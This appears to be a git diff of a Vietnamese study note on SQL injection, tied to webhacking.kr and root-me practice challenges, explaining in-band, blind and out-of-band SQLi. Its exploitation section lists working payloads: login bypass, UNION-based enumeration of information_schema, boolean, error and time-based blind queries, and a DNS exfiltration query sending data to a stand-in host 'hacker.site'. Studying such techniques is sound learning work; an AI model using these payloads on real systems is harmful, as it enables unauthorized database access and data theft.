@@ -4,38 +4,39 @@ Tìm hiểu về SQLi (SQLi là gì, hoạt động như thế nào, các loại
 =>Thực hành: Write up chi tiết các bài sau của webhacking.kr: old-45, old-49 (nếu xong sớm có thể làm thêm 27,35,39,51,61 không bắt buộc); root-me: SQL injection blind`
 
 # Tìm hiểu về SQLi 
-#### SQLi 
+## 1. SQLi 
 Là tấn công mà attacker can thiệp vào cơ sở dữ liệu thông qua các câu truy vấn để truy xuất, sửa đổi, xóa dữ liệu ở database hoặc gây ra ảnh hưởng khác tới nội dung hay thao tác người dùng...
-### SQLi hoạt động: 
+## 2. SQLi hoạt động: 
 - Đầu tiên attacker tìm kiếm các điểm yếu trên web như input, parameter...
 - Sau đó attacker sẽ thử các câu lệnh SQL cùng với các ký tự khác để xác định cách truy cập vào database
 - Cuối cùng là dùng các câu lệnh SQL để tấn công
-### Các loại tấn công phổ biến:
+## 3. Các loại tấn công phổ biến:
 - In-Band SQLi: Các phản hồi nhận được kết quả truy vấn SQL. Được chia thành 2 loại:
   * Union-based SQLi: Sử dụng câu lệnh UNION trong các truy vấn SQL để truy cập vào db.
   * Error-based SQLi: Dựa vào lỗi trong câu lệnh SQL để xác định cấu trúc db từ đó tìm cách truy cập vào db.
 - Blind SQLi: Các phản hồi không chứa kết quả truy vấn SQL. Được chia thành 2 loại:
   * Boolean: Câu truy vấn trả về chỉ cho biết đúng hoặc sai từ đó attacker điều chỉnh câu truy vấn để khai thác.
-  * Time-based: Attacker sẽ sử dụng câu truy vấn làm db trả về kết trong thời gian khác nhau tùy thuộc tính đúng sai từ đó điều chỉnh câu truy vấn để khai thác.
+  * Time-based: Attacker sẽ sử dụng câu truy vấn làm db trả về kết trong 1 thời gian xác định tùy thuộc tính đúng sai từ đó điều chỉnh câu truy vấn để khai thác.
 - Out-of-Band SQLi: Tấn công sử dụng một cấu trúc truy vấn SQL để yêu cầu sever trả về kết quả thông qua các kênh liên quan đến mạng.
-### Cách khai thác
-**1. Detect**
-
- - Gửi dấu nháy đơn ' , nháy kép ", chấm phẩy ; ký tự comment như --, #,... và chờ kết quả phản hồi của web
- - Gửi các điều kiện boolean như OR 1=1, OR 1=2 ... và xem phản hồi
+## 4. Cách khai thác
+### 4.1 Phát hiện
+ - Gửi dấu nháy đơn `'` , nháy kép `"`, chấm phẩy `;`, ký tự comment như `--`, `#`,... và chờ kết quả phản hồi của web.
+ - Gửi các điều kiện boolean như OR 1=1, OR 1=2 ... và xem phản hồi.
  - Gửi payload thử thời gian trả về như SLEEP(5), pg_sleep(10), DELAY '0:0:10' ...
  
- **2. Xác định thông tin database**
- - Xác định bằng cách sử dụng truy vấn như SELECT @@version (MySQL), SELECT * FROM v$version (Oracle)
- - Liệt kệ nội dung 
- 
-  Ví dụ với SQL Server:
+ Từ đó xác định được lỗi SQLi
 
-  * Liệt kê tên các bảng: `SELECT * FROM information_schema.tables`.
-  * Liệt kê cột từ tên bảng vừa tìm đc : `SELECT * FROM information_schema.columns WHERE table_name = 'table_name'`.
-  * Từ đó truy xuất ra nội dung.
+### 4.2 Xác định thông tin database
+ - Xác định bằng cách sử dụng truy vấn như SELECT @@version (MySQL), SELECT * FROM v$version (Oracle)...
+ - Recon bằng extension, tool, ... 
+ - Dựa vào lỗi SQL server trả về.
   
-**3. Khai thác:**
+### 4.3 Khai thác
+### In-Band SQLi
+
+#### Error-based:
+
+Chèn một truy vấn độc hại với mục tiêu nhận được thông báo lỗi cung cấp thông tin nhạy cảm về db.
 
 Phá bỏ tính logic của ứng dụng:
 
@@ -45,48 +46,91 @@ Ví dụ: khi đăng nhập với username abcdef và passwd 12345678 thì ứng
 
 Khi đó attacker có thể đăng nhập vào admin mà không cần passwd bằng sử dụng comment -- trong SQL với payload: `admin'--` khi đó câu truy vấn sẽ là :
 
-`SELECT * FROM users WHERE username = 'admin'--' AND password = ''`
+```
+SELECT * FROM users WHERE username = 'admin'--' AND password = ''
+```
 
 Hoặc có thể dùng điều kiện boolean với payload : `admin' OR 1=1 --` 
 
-- Sử dụng UNION
+Ngoài ra từ đó có thể khai thác theo hướng UNION
+
+#### Union-based SQLi
+
 Trả về kết quả của các câu lệnh SELECT từ bảng khác với điều kiện trả về cùng số cột và kiểu dữ liệu của cột.
 
-* Xác định số cột cần để tấn công: 
+- Xác định số cột cần để tấn công: 
 Sử dụng ORDER BY ví dụ `' ORDER BY x--` với x là số cột cần thử và từ phản hồi tìm được số cột
 
-Sử dụng `' UNION SELECT NULL,NULL--`
+Sử dụng `UNION SELECT` :
 
-* Sau khi tìm ra số cột thì kiểm tra kiểu dữ liệu trong cột
+```
+1' UNION SELECT null-- - Not working
+1' UNION SELECT null,null-- - Not working
+1' UNION SELECT null,null,null-- - Worked
+```
+
+Hoặc sử dụng `ORDER BY` hoặc `GROUP BY`: 
+
+```
+1' ORDER BY 1--+    #True
+1' ORDER BY 2--+    #True
+1' ORDER BY 3--+    #True
+1' ORDER BY 4--+    #False - Query is only using 3 columns
+```
+
+- Sau khi tìm ra số cột thì kiểm tra kiểu dữ liệu trong cột
 
 Giả sử ở đây là 4 cột thì 
 
 Sử dụng `' UNION SELECT 'a',NULL,NULL,NULL--`. Nếu không có lỗi trả về thì xác đinh cột đầu tiên có kiểu dữ liệu là String từ đó tìm kiếm cột khác
 
-* Từ đó tìm tên cột vvà truy xuất dữ liệu
+- Truy xuất tên db, tên bảng, tên cột:
+ 
+ ```
+ #Database names
+-1' UNION SELECT 1,2,GROUP_CONCAT(0x7c,schema_name,0x7c) FROM information_schema.schemata
 
-- Với Blind SQLi:
+#Tables of a database
+-1' UNION SELECT 1,2,3,GROUP_CONCAT(0x7c,table_name,0x7C) FROM information_schema.tables WHERE table_schema=[database]
 
-Nhập dữ liệu với giá trị boolean
+#Column names
+-1' UNION SELECT 1,2,3,GROUP_CONCAT(0x7c,column_name,0x7C) FROM information_schema.columns WHERE table_name=[table name]
+```
+ 
+ 
 
+### Blind SQLi:
 
+Trường hợp này không thể nhìn thấy kết quả truy vấn lỗi nhưng có thể phân biệt được phản hồi đúng hay sai dựa vào nội dung trả về trên trang. Khi đó có thể truy xuất tường ký tự của dữ liệu trong db:
 
+```
+?id=1 AND SELECT SUBSTR(table_name,1,1) FROM information_schema.tables = 'A'
+```
 
+#### Error Blind SQLi: 
+ 
+ Đây là trường hợp tương tự như trước nhưng thay vì phân biệt giữa phản hồi đúng/sai từ truy vấn thì có thể phân biệt giữa lỗi trong truy vấn SQL hay không (có thể do lỗi HTTP server). Do đó, trong trường hợp này có thể buộc một SQLerror mỗi khi bạn đoán đúng ký tự:
+ 
+ ```
+ AND (SELECT IF(1,(SELECT table_name FROM information_schema.tables),'a'))-- - 
+ ```
+ 
+#### Time-based SQLi: 
+ 
+ Đây là trường hợp không phân biệt được truy vấn dựa vào ngữ cảnh của trang web. Tuy nhiên có thể biết được kết quả truy vấn đúng hay sai bằng cách xác định thời gian trả về từ database: 
+ ```
+ 1 and (select sleep(10) from users where SUBSTR(table_name,1,1) = 'A')#
+ ```
+ 
+ ### Out-of-Band SQLi
+ Nếu không có phương pháp khai thác nào khác hoạt động thì có thể thử làm cho database lọc ra thông tin sang một máy chủ bên ngoài mà kiểm soát. Ví dụ: thông qua các truy vấn DNS:
+ 
+ ```
+ select load_file(concat('\\\\',version(),'.hacker.site\\a.txt'));
+ ```
+ 
+ 
 
-
-- Tấn công qua input:
- * Dữ liệu nhập vào được đưa browser gửi tới server qua GET hoặc POST method trở thành tham số truy cập tới dữ liệu
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
- 
  
  
  
